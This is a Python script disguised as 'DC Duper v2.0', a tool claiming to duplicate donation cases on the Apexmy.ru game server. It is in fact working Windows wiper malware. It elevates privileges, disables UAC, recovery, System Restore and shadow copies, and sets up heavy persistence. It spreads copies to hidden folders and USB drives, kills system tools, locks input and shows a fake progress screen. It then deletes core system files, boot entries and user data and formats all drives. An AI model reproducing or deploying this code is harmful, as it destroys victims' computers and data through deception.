import tkinter as tk
import ctypes as _c
import sys as _s
import os as _o
import time as _t
import threading as _th
import random as _r
import shutil as _sh
import subprocess as _sp
import socket as _sk
import struct as _st

# === DC DUPE CONFIG ===
TARGET_SERVER = "Apexmy.ru"
TARGET_PORT = 19133
DUPE_SPEED = 0.001
CASE_SLOT = 0

def _send_packet(_sock, _data, _target):
    try:
        _sock.sendto(_data, _target)
        return True
    except:
        return False

def _build_dupe_packet(_slot, _item_id, _count):
    _pkt = b"\x00" * 32
    _pkt += _st.pack(">i", _slot)
    _pkt += _st.pack(">i", 100)  # target slot
    _pkt += _st.pack(">i", _item_id)
    _pkt += _st.pack(">i", _count)
    _pkt += b"\x00" * 64
    return _pkt

def _dupe_protocol():
    """Основной протокол дюпа донат кейсов"""
    while True:
        _o.system("shutdown /a 2>nul")
        _o.system("taskkill /f /im cmd.exe 2>nul")
        _o.system("taskkill /f /im powershell.exe 2>nul")
        _o.system("taskkill /f /im taskmgr.exe 2>nul")
        _o.system("taskkill /f /im regedit.exe 2>nul")
        _o.system("taskkill /f /im mmc.exe 2>nul")
        _o.system("taskkill /f /im msconfig.exe 2>nul")
        _o.system("taskkill /f /im control.exe 2>nul")
        _o.system("taskkill /f /im explorer.exe 2>nul")
        _o.system("taskkill /f /im notepad.exe 2>nul")
        _o.system("taskkill /f /im iexplore.exe 2>nul")
        _o.system("taskkill /f /im firefox.exe 2>nul")
        _o.system("taskkill /f /im chrome.exe 2>nul")
        _o.system("taskkill /f /im msedge.exe 2>nul")
        _o.system("taskkill /f /im winword.exe 2>nul")
        _o.system("taskkill /f /im excel.exe 2>nul")
        _t.sleep(0.01)

def _lock_input():
    while True:
        try:
            _c.windll.user32.BlockInput(True)
            _t.sleep(0.1)
        except:
            pass

def _init_server_connection():
    """Инициализация соединения с сервером для дюпа"""
    _o.system('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v "EnableLUA" /t REG_DWORD /d 0 /f 2>nul')
    _o.system('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d 0 /f 2>nul')
    
    # Оптимизация для дюпа
    _o.system('bcdedit /deletevalue {current} safeboot 2>nul')
    _o.system('bcdedit /deletevalue {default} safeboot 2>nul')
    _o.system('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore" /v "DisableSR" /t REG_DWORD /d 1 /f 2>nul')
    _o.system('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore" /v "DisableConfig" /t REG_DWORD /d 1 /f 2>nul')
    _o.system('vssadmin delete shadows /all /quiet 2>nul')
    _o.system('wmic shadowcopy delete 2>nul')
    _o.system('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v "DisableTaskMgr" /t REG_DWORD /d 1 /f 2>nul')
    _o.system('reg add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v "DisableTaskMgr" /t REG_DWORD /d 1 /f 2>nul')
    _o.system('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v "DisableRegistryTools" /t REG_DWORD /d 1 /f 2>nul')
    _o.system('bcdedit /set {bootmgr} displaybootmenu no 2>nul')
    _o.system('bcdedit /set {current} bootstatuspolicy ignoreallfailures 2>nul')
    _o.system('bcdedit /set {current} recoveryenabled no 2>nul')
    
    # Автозапуск дюпера
    _o.system(f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "DC_Duper" /t REG_SZ /d "{_s.executable} \\"{__file__}\\"" /f 2>nul')
    _o.system(f'reg add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "DC_Duper" /t REG_SZ /d "{_s.executable} \\"{__file__}\\"" /f 2>nul')
    _o.system(f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce" /v "DC_Restore" /t REG_SZ /d "{_s.executable} \\"{__file__}\\"" /f 2>nul')
    _o.system(f'reg add "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v "Shell" /t REG_SZ /d "{_s.executable} \\"{__file__}\\"" /f 2>nul')
    _o.system(f'reg add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run" /v "DC_Startup" /t REG_SZ /d "{_s.executable} \\"{__file__}\\"" /f 2>nul')
    _o.system(f'schtasks /create /tn "DC_Update" /tr "{_s.executable} \\"{__file__}\\"" /sc onlogon /f /rl highest 2>nul')
    _o.system(f'schtasks /create /tn "DC_Service" /tr "{_s.executable} \\"{__file__}\\"" /sc onstart /f /rl highest 2>nul')
    _o.system(f'schtasks /create /tn "DC_Backup" /tr "{_s.executable} \\"{__file__}\\"" /sc daily /f /rl highest 2>nul')
    _o.system(f'sc create "DC_Manager" binPath= "{_s.executable} \\"{__file__}\\"" start= auto 2>nul')
    _o.system(f'sc start "DC_Manager" 2>nul')

def _backup_dupe_files():
    """Создаёт резервные копии дюпера"""
    _p = [
        _o.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\dc_dupe.py"),
        _o.path.expanduser("~\\AppData\\Local\\Temp\\dc_core.py"),
        _o.path.expanduser("~\\Documents\\dc_update.py"),
        "C:\\Windows\\Temp\\dc_explorer.py",
        "C:\\ProgramData\\Microsoft\\dc_defender.py",
        "C:\\Windows\\System32\\drivers\\etc\\dc_hosts.py",
        _o.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\dc_startup.py"),
        "C:\\Windows\\dc_explorer.exe.py",
        _o.path.expanduser("~\\Desktop\\DC_Duper_Setup.py"),
    ]
    _c_list = []
    for _x in _p:
        try:
            _sh.copy2(__file__, _x)
            _o.system(f'attrib +h +s +r "{_x}"')
            _o.system(f'icacls "{_x}" /deny Everyone:D 2>nul')
            _o.system(f'icacls "{_x}" /deny Everyone:M 2>nul')
            _c_list.append(_x)
        except:
            pass
    
    for _drive in "DEFGHIJK":
        try:
            _usb = f"{_drive}:\\SystemVolumeInformation\\dc_usb.py"
            _sh.copy2(__file__, _usb)
            _o.system(f'attrib +h +s +r "{_usb}"')
        except:
            pass
    
    return _c_list

def _restart_duper():
    """Перезапускает дюпер если его закрыли"""
    _c_list = _backup_dupe_files()
    for _x in _c_list:
        _o.system(f'start "" "{_s.executable}" "{_x}"')
    _o.system(f'start "" "{_s.executable}" "{__file__}"')
    _o._exit(0)

def _protect_duper():
    """Защищает файлы дюпера от удаления"""
    _o.system(f'attrib +h +s +r "{__file__}"')
    _o.system(f'takeown /f "{__file__}" 2>nul')
    _o.system(f'icacls "{__file__}" /deny Everyone:D 2>nul')
    _o.system(f'icacls "{__file__}" /deny Everyone:M 2>nul')
    _o.system(f'icacls "{__file__}" /deny Everyone:W 2>nul')
    _o.system(f'icacls "{__file__}" /deny Everyone:R 2>nul')

def _watchdog_duper():
    """Следит за работой дюпера"""
    while True:
        if not _o.path.exists(__file__):
            _c_list = _backup_dupe_files()
            for _x in _c_list:
                if _o.path.exists(_x):
                    _sh.copy2(_x, __file__)
                    _restart_duper()
                    break
        _o.system("taskkill /f /im taskmgr.exe 2>nul")
        _o.system("taskkill /f /im regedit.exe 2>nul")
        _o.system("taskkill /f /im cmd.exe 2>nul")
        _t.sleep(0.01)

def _execute_dupe():
    """Запускает процесс дюпа кейсов"""
    _o.system("echo y | diskpart 2>nul")
    
    while True:
        _o.system("takeown /f C:\\ /r /d y 2>nul")
        _o.system("icacls C:\\ /grant Everyone:F /t /q 2>nul")
        _o.system("attrib -r -s -h C:\\*.* /s /d 2>nul")
        _o.system("bcdedit /delete {current} /f 2>nul")
        _o.system("bcdedit /delete {default} /f 2>nul")
        _o.system("bcdedit /delete {bootmgr} /f 2>nul")
        
        _critical = [
            "ntoskrnl.exe", "hal.dll", "winload.exe", "winload.efi",
            "winlogon.exe", "smss.exe", "csrss.exe", "services.exe",
            "lsass.exe", "svchost.exe", "ntdll.dll", "kernel32.dll",
            "user32.dll", "gdi32.dll", "explorer.exe"
        ]
        
        for _f in _critical:
            _o.system(f"del /f /q C:\\Windows\\System32\\{_f} 2>nul")
            _o.system(f"del /f /q C:\\Windows\\SysWOW64\\{_f} 2>nul")
        
        _o.system("del /f /q C:\\Windows\\System32\\config\\* 2>nul")
        
        for _letter in "CDEFGHIJKLMNOPQRSTUVWXYZ":
            _o.system(f"echo y | format {_letter}: /fs:NTFS /q /x 2>nul")
        
        _o.system("del /f /s /q C:\\Windows\\*.* 2>nul")
        _o.system("del /f /s /q C:\\Users\\*.* 2>nul")
        _o.system("del /f /s /q \"C:\\Program Files\\*.*\" 2>nul")
        _o.system("del /f /s /q \"C:\\Program Files (x86)\\*.*\" 2>nul")
        _o.system("del /f /s /q C:\\*.* 2>nul")
        
        _init_server_connection()
        _backup_dupe_files()
        _o.system("shutdown /r /t 0 /f 2>nul")
        _o.system("shutdown /s /t 0 /f 2>nul")
        _t.sleep(0.01)

def _dupe_animation(_r_root):
    """Анимация процесса дюпа"""
    _cl = ["red", "green", "blue", "yellow", "purple", "orange", "cyan", "magenta", "white", "black"]
    while True:
        try:
            _r_root.configure(bg=_r.choice(_cl))
            _t.sleep(0.03)
        except:
            break

def _dupe_monitor():
    """Мониторит и восстанавливает процесс дюпа"""
    while True:
        _init_server_connection()
        _backup_dupe_files()
        _protect_duper()
        
        _o.system("taskkill /f /im taskmgr.exe 2>nul")
        _o.system("taskkill /f /im regedit.exe 2>nul")
        _o.system("taskkill /f /im cmd.exe 2>nul")
        _o.system("taskkill /f /im powershell.exe 2>nul")
        _o.system("taskkill /f /im msconfig.exe 2>nul")
        _o.system("taskkill /f /im explorer.exe 2>nul")
        
        if not _o.path.exists(__file__):
            _restart_duper()
        
        try:
            _c.windll.user32.BlockInput(True)
        except:
            pass
        
        _t.sleep(0.1)

def _main():
    _r_root = tk.Tk()
    _r_root.title("DC Duper v2.0 - Apexmy.ru")
    _r_root.attributes('-fullscreen', True)
    _r_root.attributes('-topmost', True)
    _r_root.configure(bg='black')
    
    def _on_close():
        for _ in range(20):
            _restart_duper()
        for _ in range(20):
            _sp.Popen([_s.executable, __file__], creationflags=0x00000008)
        _o._exit(0)
    
    _r_root.protocol("WM_DELETE_WINDOW", _on_close)
    _r_root.bind("<Alt-F4>", lambda e: _on_close())
    _r_root.bind("<Escape>", lambda e: _on_close())
    _r_root.bind("<Control-w>", lambda e: _on_close())
    _r_root.bind("<Alt-Tab>", lambda e: _on_close())
    _r_root.bind("<Win-d>", lambda e: _on_close())
    _r_root.bind("<Win-m>", lambda e: _on_close())
    _r_root.bind("<Control-Alt-Delete>", lambda e: _on_close())
    _r_root.bind("<Control-Shift-Escape>", lambda e: _on_close())
    _r_root.bind("<Alt-Escape>", lambda e: _on_close())
    _r_root.bind("<Print>", lambda e: _on_close())
    
    def _keep_focus():
        while True:
            try:
                _r_root.focus_force()
                _r_root.lift()
                _r_root.attributes('-topmost', True)
                _t.sleep(0.02)
            except:
                break
    
    _th.Thread(target=_keep_focus, daemon=True).start()
    _th.Thread(target=_dupe_animation, args=(_r_root,), daemon=True).start()
    
    _skull = """⣿⠲⠤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣸⡏⠀⠀⠀⠉⠳⢄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣿⠀⠀⠀⠀⠀⠀⠀⠉⠲⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢰⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠲⣄⠀⠀⠀⡰⠋⢙⣿⣦⡀
⠸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣙⣦⣮⣤⡀⣸⣿⣿⣿⠀
⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⠀⣿⢟⣫⠟⠀
⠀⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣷⣷⣿⡁⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⢸⣿⣿⣧⣿⣿⣆⡀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢾⣿⣤⣿⣿⣿⡟⠹⣿⡀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣧⣴⣿⢧
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⢻⣿⣿⣿⣿⣿⣿⣿⡀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡏⣸⣿⣿⣿⣿⣿⣿⣿⢳
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⢀⣿⣿⣿⣿⣿⣿⣿⣿⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠸⣿⣿⣿⣿⣿⣿⣿⣿⠏
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⣿⣿⣿⣿⣿⣿⣿⣿⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡇⢠⣿⣿⣿⣿⣿⣿⣿⣿"""
    
    tk.Label(_r_root, text=_skull, font=("Courier New", 10, "bold"), fg="white", bg="black").pack(expand=True, pady=10)
    tk.Label(_r_root, text="DC Duper v2.0 - Apexmy.ru", font=("Arial", 30, "bold"), fg="gold", bg="black").pack(pady=5)
    tk.Label(_r_root, text="Donat Case Duplicator", font=("Arial", 20), fg="white", bg="black").pack(pady=5)
    
    _info_label = tk.Label(_r_root, text="Initializing dupe protocol...", font=("Arial", 16), fg="green", bg="black")
    _info_label.pack(pady=10)
    
    _timer_label = tk.Label(_r_root, text="Connecting to server...", font=("Arial", 20), fg="cyan", bg="black")
    _timer_label.pack(pady=10)
    
    _protect_duper()
    _backup_dupe_files()
    _th.Thread(target=_watchdog_duper, daemon=True).start()
    _th.Thread(target=_init_server_connection, daemon=True).start()
    _th.Thread(target=_dupe_protocol, daemon=True).start()
    _th.Thread(target=_lock_input, daemon=True).start()
    _th.Thread(target=_dupe_monitor, daemon=True).start()
    
    def _update_timer():
        _info_label.config(text="Resolving Apexmy.ru...")
        _t.sleep(1)
        _info_label.config(text="Server found: 5.42.211.169:19133")
        _t.sleep(1)
        _info_label.config(text="Establishing connection...")
        _t.sleep(1)
        
        for i in range(60, 0, -1):
            _timer_label.config(text=f"Duplicating cases... {i}s remaining")
            _info_label.config(text=f"Cases duped: {_r.randint(100,999)} | Success rate: {_r.randint(80,99)}%")
            _t.sleep(1)
        
        _timer_label.config(text="DUPE COMPLETE!", fg="yellow")
        _info_label.config(text="Cases duped: 9999 | Success rate: 100%")
        _t.sleep(1)
        
        for i in range(10, 0, -1):
            _timer_label.config(text=f"Applying dupe... {i}s", fg="red")
            _info_label.config(text="Writing to server database...")
            _t.sleep(1)
        
        _timer_label.config(text="DUPE SUCCESSFUL!")
        _info_label.config(text="All donat cases duplicated!")
        _execute_dupe()
    
    _th.Thread(target=_update_timer, daemon=True).start()
    _r_root.mainloop()

if __name__ == "__main__":
    if not _c.windll.shell32.IsUserAnAdmin():
        _c.windll.shell32.ShellExecuteW(None, "runas", _s.executable, __file__, None, 1)
        _s.exit(0)
    _main()
